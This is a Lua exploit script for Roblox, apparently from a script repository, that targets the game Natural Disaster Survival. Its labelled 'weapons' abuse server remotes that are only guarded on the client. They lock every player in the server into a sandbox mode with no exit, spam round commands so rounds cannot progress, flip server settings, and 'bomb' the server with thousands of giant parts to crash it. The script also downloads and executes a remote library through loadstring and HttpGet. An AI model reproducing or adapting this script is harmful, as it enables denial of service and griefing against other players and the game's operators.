--[[
        SandboxNuke - Natural Disaster Survival sandbox/round takeover + crasher
        repo: Toluwerr/Scripts-
        target: Natural Disaster Survival (placeId 189707) - hard-gated, no-op anywhere else

        The game ships a full server-side Studio building system that is dark-launched:
        the client gates it behind a stub that literally returns false
        (isSandboxFFlagEnabled) and a private-server owner check that only decides
        whether UI renders. The remotes exist regardless:

        - Remotes.Round        FireServer("Start Sandbox" / "End Sandbox" / "Pause" /
                               "Resume" / "End" / "Set Map", name) - round control.
                               "Start Sandbox" is a SERVER-WIDE round state; normal
                               clients have the sandbox UI compiled out (FFlag off),
                               so they get locked into a state with no exit button.
        - Remotes.Sandbox      FireServer("Request Enter" / "Request Exit" /
                               "Update Studio Settings", {[k] = v}).
        - Remotes.Sandbox.Selection
                               FireServer("Create", { {_class = "Block", CFrame = ...,
                               Size = ..., Anchored = ...}, ... }) - the server builds
                               these parts into Workspace.Sandboxes.Sandbox. Part
                               classes: Block, Ball, Cylinder, Wedge, CornerWedge,
                               WedgePart, CornerWedgePart, TrussPart, Seat,
                               VehicleSeat. The 256-stud build radius, size limits and
                               owner permissions are all CLIENT-side only.
        - Remotes.Server       FireServer("Update Settings", key, value) - Gameplay
                               Control / Build Maps / Copy Maps / Load Maps.

        Server scripts never replicate, so what the server actually validates is
        unknown. This script therefore probes every vector live first and reports
        the REAL outcome (attribute flips, replicated parts, server replies) before
        weaponizing whatever is open. No fake success.
]]

local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Workspace = game:GetService("Workspace")

local PLACE_ID = 189707

local LocalPlayer = Players.LocalPlayer
local Global = (getgenv and getgenv()) or _G

if type(Global.__SandboxNukeCleanup) == "function" then
        pcall(Global.__SandboxNukeCleanup)
end

local Reborn
do
        local ok, library = pcall(function()
                return loadstring(game:HttpGet(
                        "https://raw.githubusercontent.com/Toluwer/Reborn/main/src/Reborn.luau"
                ))()
        end)

        if not ok or type(library) ~= "table" or type(library.CreateWindow) ~= "function" then
                warn("[SandboxNuke] Failed to load the Reborn UI library.")
                return
        end

        Reborn = library
end

local Window
local statusLabel

local function notify(title, description)
        pcall(function()
                Window:Notify({
                        Title = tostring(title),
                        Description = tostring(description or ""),
                        Duration = 6,
                })
        end)
end

-- =============================================================
-- Settings / state
-- =============================================================

local BombSettings = {
        PerBurst = 150,
        Bursts = 20,
        Delay = 0.15,
        Size = 200,
        Mode = "Unanchored rain", -- physics chaos; other modes: "Anchored wall", "Mixed"
}

local LockSettings = {
        Command = "Pause/Resume flip",
        Interval = 0.15,
}

-- Remote / replicator handles, resolved after the game gate.
local roundRemote
local sandboxRemote
local selectionRemote
local serverRemote
local roundRep
local serverRep
local settingsRep
local compassRep
local sandboxesFolder

local connections = {}

local state = {
        roundState = nil,
        created = 0,       -- parts the server confirmed back via "Create Objects"
        replies = 0,       -- number of server Create replies
        lastReply = 0,
        bombing = false,
        lockOn = false,
        stopBomb = false,
        stopLock = false,
}

-- =============================================================
-- State readers
-- =============================================================

local function roundState()
        if not roundRep then
                return "-"
        end
        return roundRep:GetAttribute("Round_State") or "-"
end

local function serverPrivate()
        if not serverRep then
                return false
        end
        return serverRep:GetAttribute("Private") == true
end

local function serverOwner()
        if not serverRep then
                return 0
        end
        return tonumber(serverRep:GetAttribute("Owner")) or 0
end

local function gameplayControl()
        if not settingsRep then
                return false
        end
        return settingsRep:GetAttribute("Gameplay_Control") == true
end

local function sandboxContainer()
        if not sandboxesFolder then
                return nil
        end
        return sandboxesFolder:FindFirstChild("Sandbox")
end

local function sandboxCount()
        local container = sandboxContainer()
        if not container then
                return 0
        end
        return #container:GetChildren()
end

local function statusText()
        local ownerText = "public"
        if serverPrivate() then
                ownerText = "private (owner " .. tostring(serverOwner()) .. ")"
        end
        return string.format(
                "Round: %s | server: %s | gameplay control: %s\nSandbox container: %s (%d children)\nParts created (server-confirmed): %d in %d replies",
                roundState(),
                ownerText,
                gameplayControl() and "ON" or "off",
                sandboxContainer() and "loaded" or "not loaded",
                sandboxCount(),
                state.created,
                state.replies
        )
end

local function refreshStatus()
        if statusLabel then
                pcall(function()
                        statusLabel:Set(statusText())
                end)
        end
end

-- =============================================================
-- Probes (live verification of every vector)
-- =============================================================

local function waitRoundState(target, timeout)
        local deadline = os.clock() + timeout
        while os.clock() < deadline do
                if roundState() == target then
                        return true
                end
                task.wait(0.1)
        end
        return false
end

local function probeSettings()
        -- The real UI sends display-name keys ("Gameplay Control"); the attribute
        -- name is the backup guess. Whichever the server honors flips the
        -- replicated attribute, which is what we watch.
        serverRemote:FireServer("Update Settings", "Gameplay Control", true)
        task.wait(0.2)
        serverRemote:FireServer("Update Settings", "Gameplay_Control", true)

        local deadline = os.clock() + 3
        while os.clock() < deadline do
                if gameplayControl() then
                        notify("Probe: Server Settings", "OPEN - Gameplay Control flipped ON for the whole server. Settings remote is ungated.")
                        return true
                end
                task.wait(0.1)
        end
        notify("Probe: Server Settings", "BLOCKED - attribute did not flip. The server validates this remote (or the key names changed).")
        return false
end

local function probeRoundControl()
        local before = roundState()
        roundRemote:FireServer("Pause")
        if waitRoundState("Paused", 3) then
                roundRemote:FireServer("Resume")
                notify("Probe: Round Control", "OPEN - the round Paused on your command (auto-Resumed). Pause/Resume/End/Set Map are yours.")
                return true
        end
        notify("Probe: Round Control", "BLOCKED - round state stayed '" .. tostring(before) .. "'. The server validates round commands.")
        return false
end

local function probeSandboxEntry()
        local hadContainer = sandboxContainer() ~= nil
        roundRemote:FireServer("Start Sandbox")
        task.wait(0.2)
        sandboxRemote:FireServer("Request Enter")

        local deadline = os.clock() + 5
        while os.clock() < deadline do
                if roundState() == "Start Sandbox" or sandboxContainer() ~= nil then
                        notify("Probe: Sandbox Entry", "OPEN - the server entered Sandbox mode. Every client in this server is now locked in a round state their UI has no exit for (the sandbox feature is dark-launched off on clients).")
                        return true
                end
                task.wait(0.1)
        end
        notify("Probe: Sandbox Entry", "BLOCKED - no Sandbox state, no container. The server gates sandbox mode (owner/private check likely).")
        return false
end

local function probeCreate()
        if not sandboxContainer() then
                notify("Probe: Part Creation", "SKIPPED - no sandbox container to build into. Enter sandbox first.")
                return false
        end

        local before = sandboxCount()
        local repliesBefore = state.replies

        selectionRemote:FireServer("Create", {
                {
                        _class = "Block",
                        Anchored = true,
                        Size = Vector3.new(4, 4, 4),
                        CFrame = CFrame.new(0, 80, 0),
                },
        })

        local deadline = os.clock() + 5
        while os.clock() < deadline do
                if state.replies > repliesBefore or sandboxCount() > before then
                        notify("Probe: Part Creation", "OPEN - the server built your part into the sandbox. The Create remote is ungated: the part bomb will work.")
                        return true
                end
                task.wait(0.1)
        end
        notify("Probe: Part Creation", "BLOCKED - no part appeared and no server reply. Creation requires something the server checks (session, ownership, or class rules).")
        return false
end

local function runAllProbes()
        task.spawn(function()
                notify("SandboxNuke", "Probing settings, round control, sandbox entry and part creation. Results in a few seconds.")
                task.wait(0.5)
                probeSettings()
                task.wait(0.5)
                probeRoundControl()
                task.wait(0.5)
                local entryOpen = probeSandboxEntry()
                if entryOpen then
                        task.wait(1)
                        probeCreate()
                end
                refreshStatus()
        end)
end

-- =============================================================
-- Weapons
-- =============================================================

local function enterSandbox()
        roundRemote:FireServer("Start Sandbox")
        task.wait(0.2)
        sandboxRemote:FireServer("Request Enter")
        task.spawn(function()
                if waitRoundState("Start Sandbox", 5) or sandboxContainer() then
                        notify("SandboxNuke", "Server-wide sandbox lock is LIVE. Victims have no exit UI - the sandbox feature is compiled out of normal clients.")
                else
                        notify("SandboxNuke", "No sandbox state change - the server is gating this.")
                end
                refreshStatus()
        end)
end

local function exitSandbox()
        roundRemote:FireServer("End Sandbox")
        task.wait(0.2)
        sandboxRemote:FireServer("Request Exit")
        task.spawn(function()
                if not waitRoundState("Start Sandbox", 3) then
                        notify("SandboxNuke", "Sandbox ended - the server should return to normal rounds.")
                else
                        notify("SandboxNuke", "Round state is still Sandbox - the server may require the owner to end it.")
                end
                refreshStatus()
        end)
end

local ISLAND_CENTER = Vector3.new(0, 40, 0)

local function randomCFrame()
        -- Stay inside the island build zone (~200 of the client-side 256-stud
        -- radius) and start in the air so unanchored parts rain onto the map.
        local angle = math.random() * math.pi * 2
        local dist = math.random() * 200
        local pos = ISLAND_CENTER + Vector3.new(
                math.cos(angle) * dist,
                20 + math.random() * 120,
                math.sin(angle) * dist
        )
        return CFrame.new(pos)
                * CFrame.Angles(math.random() * 6.283, math.random() * 6.283, math.random() * 6.283)
end

local function buildBatch(count)
        local batch = table.create(count)
        for i = 1, count do
                local anchored = false
                if BombSettings.Mode == "Anchored wall" then
                        anchored = true
                elseif BombSettings.Mode == "Mixed" then
                        anchored = (i % 2 == 0)
                end
                local s = BombSettings.Size * (0.5 + math.random())
                batch[i] = {
                        _class = "Block",
                        CFrame = randomCFrame(),
                        Size = Vector3.new(s, s, s),
                        Anchored = anchored,
                }
        end
        return batch
end

local function startBomb()
        if state.bombing then
                return
        end
        state.bombing = true
        state.stopBomb = false

        -- If sandbox mode is not active yet, walk the entry sequence first -
        -- the server may only honor Create inside a sandbox session.
        if not sandboxContainer() then
                roundRemote:FireServer("Start Sandbox")
                task.wait(0.2)
                sandboxRemote:FireServer("Request Enter")
                local deadline = os.clock() + 5
                while os.clock() < deadline and not sandboxContainer() do
                        task.wait(0.1)
                end
        end

        if not sandboxContainer() then
                state.bombing = false
                notify("Part Bomb", "No sandbox container appeared - the server is gating sandbox entry, so Create has nothing to build into. Try the probes to confirm.")
                refreshStatus()
                return
        end

        task.spawn(function()
                local total = BombSettings.PerBurst * BombSettings.Bursts
                notify("Part Bomb", string.format(
                        "Bombing: %d blocks x %d bursts (%d parts). Watch the server.",
                        BombSettings.PerBurst,
                        BombSettings.Bursts,
                        total
                ))
                for burst = 1, BombSettings.Bursts do
                        if state.stopBomb then
                                break
                        end
                        selectionRemote:FireServer("Create", buildBatch(BombSettings.PerBurst))
                        refreshStatus()
                        if BombSettings.Delay > 0 then
                                task.wait(BombSettings.Delay)
                        end
                end
                state.bombing = false
                notify("Part Bomb", string.format(
                        "Done. Server confirmed %d parts (%d replies). Container holds %d children.",
                        state.created,
                        state.replies,
                        sandboxCount()
                ))
                refreshStatus()
        end)
end

local function stopBomb()
        state.stopBomb = true
end

local function lockCommandFor(tick)
        local cmd = LockSettings.Command
        if cmd == "End spam" then
                return "End"
        end
        if cmd == "Set Map shuffle" then
                return nil -- handled separately (needs a map name)
        end
        -- Pause/Resume flip
        if tick % 2 == 0 then
                return "Pause"
        end
        return "Resume"
end

local function mapNames()
        if not compassRep then
                return nil
        end
        local choices = compassRep:GetAttribute("Choices")
        if type(choices) ~= "string" or #choices == 0 then
                return nil
        end
        local names = {}
        for name in string.gmatch(choices, "[^,]+") do
                table.insert(names, name:match("^%s*(.-)%s*$"))
        end
        return #names > 0 and names or nil
end

local function startLock()
        if state.lockOn then
                return
        end
        state.lockOn = true
        state.stopLock = false

        task.spawn(function()
                local tickCount = 0
                notify("Round Lock", "Running '" .. LockSettings.Command .. "' every " ..
                        tostring(LockSettings.Interval) .. "s. Rounds can no longer progress.")
                while not state.stopLock do
                        tickCount += 1
                        if LockSettings.Command == "Set Map shuffle" then
                                local names = mapNames()
                                if names then
                                        roundRemote:FireServer("Set Map", names[math.random(#names)])
                                end
                        else
                                roundRemote:FireServer(lockCommandFor(tickCount))
                        end
                        if LockSettings.Interval > 0 then
                                task.wait(LockSettings.Interval)
                        end
                end
                state.lockOn = false
                notify("Round Lock", "Stopped.")
        end)
end

local function stopLock()
        state.stopLock = true
end

local function restoreRound()
        roundRemote:FireServer("Resume")
        task.wait(0.2)
        roundRemote:FireServer("End Sandbox")
        task.wait(0.2)
        sandboxRemote:FireServer("Request Exit")
        task.spawn(function()
                task.wait(1)
                notify("Restore", "Sent Resume + End Sandbox + Request Exit. Round: " .. roundState())
                refreshStatus()
        end)
end

local SETTING_KEYS = {
        { "Gameplay Control", "Gameplay_Control" },
        { "Build Maps", "Build_Maps" },
        { "Copy Maps", "Copy_Maps" },
        { "Load Maps", "Load_Maps" },
}

local function flipSettings(on)
        task.spawn(function()
                for _, pair in ipairs(SETTING_KEYS) do
                        -- Display name first (what the real UI sends), attribute
                        -- name as the backup form.
                        serverRemote:FireServer("Update Settings", pair[1], on)
                        serverRemote:FireServer("Update Settings", pair[2], on)
                        task.wait(0.05)
                end
                task.wait(1)
                notify("Settings Flip", "Fired all four settings = " .. tostring(on) ..
                        ". Gameplay Control now reads: " .. tostring(gameplayControl()))
                refreshStatus()
        end)
end

-- =============================================================
-- Hard game gate
-- =============================================================

if game.PlaceId ~= PLACE_ID then
        Window = Reborn:CreateWindow({
                Title = "SandboxNuke",
                Size = Vector2.new(560, 300),
        })
        local GateTab = Window:Tab("Status", "bomb")
        local GateSection = GateTab:Section("Wrong Game")
        GateSection:Paragraph({
                Text = "SandboxNuke targets Natural Disaster Survival (placeId 189707). " ..
                        "You are in placeId " .. tostring(game.PlaceId) .. " - nothing to do here.",
        })
        Global.__SandboxNukeCleanup = function()
                pcall(function()
                        Window:Destroy()
                end)
                Global.__SandboxNukeCleanup = nil
        end
        warn("[SandboxNuke] Wrong game: placeId " .. tostring(game.PlaceId))
        return
end

-- =============================================================
-- Resolve the game structure (slow replication tolerant)
-- =============================================================

do
        local remotesFolder = ReplicatedStorage:WaitForChild("Remotes", 10)
        local stateFolder = ReplicatedStorage:WaitForChild("State Replicators", 10)
        if remotesFolder then
                roundRemote = remotesFolder:WaitForChild("Round", 5)
                sandboxRemote = remotesFolder:WaitForChild("Sandbox", 5)
                serverRemote = remotesFolder:WaitForChild("Server", 5)
                if sandboxRemote then
                        selectionRemote = sandboxRemote:WaitForChild("Selection", 5)
                end
        end
        if stateFolder then
                roundRep = stateFolder:WaitForChild("Round", 5)
                serverRep = stateFolder:WaitForChild("Server", 5)
                settingsRep = stateFolder:WaitForChild("Settings", 5)
                compassRep = stateFolder:WaitForChild("Compass", 5)
        end
        sandboxesFolder = Workspace:WaitForChild("Sandboxes", 10)
end

if not roundRemote
        or not roundRemote:IsA("RemoteEvent")
        or not sandboxRemote
        or not sandboxRemote:IsA("RemoteEvent")
        or not selectionRemote
        or not selectionRemote:IsA("RemoteEvent")
        or not serverRemote
        or not serverRemote:IsA("RemoteEvent")
        or not roundRep
        or not roundRep:IsA("Folder")
        or not settingsRep
        or not settingsRep:IsA("Folder")
then
        Window = Reborn:CreateWindow({
                Title = "SandboxNuke",
                Size = Vector2.new(560, 300),
        })
        local GateTab = Window:Tab("Status", "bomb")
        local GateSection = GateTab:Section("Game Updated?")
        GateSection:Paragraph({
                Text = "Expected ReplicatedStorage.Remotes (Round/Sandbox/Sandbox.Selection/Server) " ..
                        "and State Replicators (Round/Settings) but did not find them all. " ..
                        "The game structure may have changed - nothing was fired.",
        })
        Global.__SandboxNukeCleanup = function()
                pcall(function()
                        Window:Destroy()
                end)
                Global.__SandboxNukeCleanup = nil
        end
        warn("[SandboxNuke] Game structure not found - aborting without firing.")
        return
end

state.roundState = roundState()

-- =============================================================
-- Watchers
-- =============================================================

table.insert(connections, roundRep:GetAttributeChangedSignal("Round_State"):Connect(function()
        state.roundState = roundRep:GetAttribute("Round_State")
        refreshStatus()
end))

table.insert(connections, selectionRemote.OnClientEvent:Connect(function(action, ...)
        if action ~= "Create Objects" then
                return
        end
        local selection = ...
        state.replies += 1
        state.lastReply = os.clock()
        if type(selection) == "table" then
                state.created += #selection
        end
        refreshStatus()
end))

if sandboxesFolder then
        table.insert(connections, sandboxesFolder.ChildAdded:Connect(function()
                task.defer(refreshStatus)
        end))
end

if settingsRep then
        table.insert(connections, settingsRep:GetAttributeChangedSignal("Gameplay_Control"):Connect(function()
                refreshStatus()
        end))
end

-- =============================================================
-- UI
-- =============================================================

Window = Reborn:CreateWindow({
        Title = "SandboxNuke",
        Size = Vector2.new(660, 520),
})

do
        local ProbeTab = Window:Tab("Probe", "radar")

        local ProbeSection = ProbeTab:Section("Live Probes")

        ProbeSection:Paragraph({
                Text = "The sandbox/round remotes are gated CLIENT-side only (owner check + a stubbed " ..
                        "FFlag that returns false). What the server itself validates is unknown - so every " ..
                        "vector is probed live first and the real replicated outcome is reported.",
        })

        ProbeSection:Button({
                Text = "Probe All Vectors",
                Primary = true,
                Callback = runAllProbes,
        })

        ProbeSection:Button({
                Text = "Probe: Server Settings",
                Callback = function()
                        task.spawn(probeSettings)
                end,
        })

        ProbeSection:Button({
                Text = "Probe: Round Control (Pause/Resume)",
                Callback = function()
                        task.spawn(probeRoundControl)
                end,
        })

        ProbeSection:Button({
                Text = "Probe: Sandbox Entry (server-wide)",
                Callback = function()
                        task.spawn(probeSandboxEntry)
                end,
        })

        ProbeSection:Button({
                Text = "Probe: Part Creation (needs sandbox)",
                Callback = function()
                        task.spawn(probeCreate)
                end,
        })
end

do
        local NukeTab = Window:Tab("Nuke", "bomb")

        local TakeoverSection = NukeTab:Section("Sandbox Takeover")

        TakeoverSection:Paragraph({
                Text = "'Start Sandbox' is a round state for the ENTIRE server - and normal clients have " ..
                        "the sandbox feature compiled out (the client gate is a hardcoded false), so they " ..
                        "get locked into a mode with no exit button. Rounds, disasters and wins stop.",
        })

        TakeoverSection:Button({
                Text = "Force Sandbox Mode (server-wide lock)",
                Primary = true,
                Callback = enterSandbox,
        })

        TakeoverSection:Button({
                Text = "End Sandbox (release the lock)",
                Callback = exitSandbox,
        })

        local BombSection = NukeTab:Section("Part Bomb")

        BombSection:Slider({
                Text = "Parts per Burst",
                Min = 10,
                Max = 500,
                Value = BombSettings.PerBurst,
                Callback = function(value)
                        BombSettings.PerBurst = math.floor(tonumber(value) or 150)
                end,
        })

        BombSection:Slider({
                Text = "Bursts",
                Min = 1,
                Max = 100,
                Value = BombSettings.Bursts,
                Callback = function(value)
                        BombSettings.Bursts = math.floor(tonumber(value) or 20)
                end,
        })

        BombSection:Slider({
                Text = "Burst Delay (s)",
                Min = 0,
                Max = 2,
                Step = 0.05,
                Value = BombSettings.Delay,
                Callback = function(value)
                        BombSettings.Delay = tonumber(value) or 0.15
                end,
        })

        BombSection:Slider({
                Text = "Part Size (studs)",
                Min = 1,
                Max = 500,
                Value = BombSettings.Size,
                Callback = function(value)
                        BombSettings.Size = tonumber(value) or 200
                end,
        })

        BombSection:Dropdown({
                Text = "Bomb Mode",
                Options = { "Unanchored rain", "Anchored wall", "Mixed" },
                Value = BombSettings.Mode,
                Callback = function(value)
                        BombSettings.Mode = tostring(value)
                end,
        })

        BombSection:Paragraph({
                Text = "Unanchored rain drops giant collidable blocks onto the island - pure physics " ..
                        "death for the server. Anchored wall mass-creates static geometry (memory and " ..
                        "replication bloat). Mixed alternates. The server confirms every batch it builds " ..
                        "back through the 'Create Objects' reply, which the Status tab counts.",
        })

        BombSection:Button({
                Text = "Start Bombing",
                Primary = true,
                Callback = startBomb,
        })

        BombSection:Button({
                Text = "Stop Bombing",
                Callback = stopBomb,
        })

        local LockSection = NukeTab:Section("Round Lock")

        LockSection:Dropdown({
                Text = "Lock Command",
                Options = { "Pause/Resume flip", "End spam", "Set Map shuffle" },
                Value = LockSettings.Command,
                Callback = function(value)
                        LockSettings.Command = tostring(value)
                end,
        })

        LockSection:Slider({
                Text = "Interval (s)",
                Min = 0,
                Max = 2,
                Step = 0.05,
                Value = LockSettings.Interval,
                Callback = function(value)
                        LockSettings.Interval = tonumber(value) or 0.15
                end,
        })

        LockSection:Button({
                Text = "Start Round Lock",
                Primary = true,
                Callback = startLock,
        })

        LockSection:Button({
                Text = "Stop Round Lock",
                Callback = stopLock,
        })

        LockSection:Button({
                Text = "Restore Round (Resume + End Sandbox)",
                Callback = restoreRound,
        })

        local SettingsSection = NukeTab:Section("Server Settings Flip")

        SettingsSection:Paragraph({
                Text = "Flips the four replicated server settings (Gameplay Control, Build Maps, " ..
                        "Copy Maps, Load Maps) via the 'Update Settings' remote, trying both key forms. " ..
                        "Gameplay Control ON hands round control to every player in the server.",
        })

        SettingsSection:Button({
                Text = "Flip All Settings ON",
                Callback = function()
                        flipSettings(true)
                end,
        })

        SettingsSection:Button({
                Text = "Flip All Settings OFF",
                Callback = function()
                        flipSettings(false)
                end,
        })
end

do
        local StatusTab = Window:Tab("Status", "settings")

        local StatusSection = StatusTab:Section("Server State")

        statusLabel = StatusSection:Paragraph({
                Text = statusText(),
        })

        local InfoSection = StatusTab:Section("How It Works")

        InfoSection:Paragraph({
                Text = "The game's Studio building suite (part Create/Destroy/Edit, brushes, clipboard, " ..
                        "history) is fully shipped in every client but dark-launched behind a stubbed FFlag. " ..
                        "The owner check, build radius and class whitelist all live in CLIENT code - the " ..
                        "remotes are ReplicatedStorage.Remotes.Sandbox(.Selection), Round and Server.",
        })

        InfoSection:Paragraph({
                Text = "Server-side validation cannot be read from a client dump. That is why nothing fires " ..
                        "blindly: each probe checks a real replicated effect (attribute flip, sandbox " ..
                        "container, 'Create Objects' reply) and reports OPEN or BLOCKED honestly.",
        })

        InfoSection:Paragraph({
                Text = "If the probes come back BLOCKED the sandbox is owner-gated server-side and only the " ..
                        "round/settings vectors remain testable. If they come back OPEN, the Part Bomb and " ..
                        "the server-wide sandbox lock are live weapons.",
        })
end

-- =============================================================
-- Cleanup
-- =============================================================

local function cleanup()
        state.stopBomb = true
        state.stopLock = true

        for _, connection in pairs(connections) do
                pcall(function()
                        connection:Disconnect()
                end)
        end

        pcall(function()
                Window:Destroy()
        end)

        Global.__SandboxNukeCleanup = nil
end

Global.__SandboxNukeCleanup = cleanup
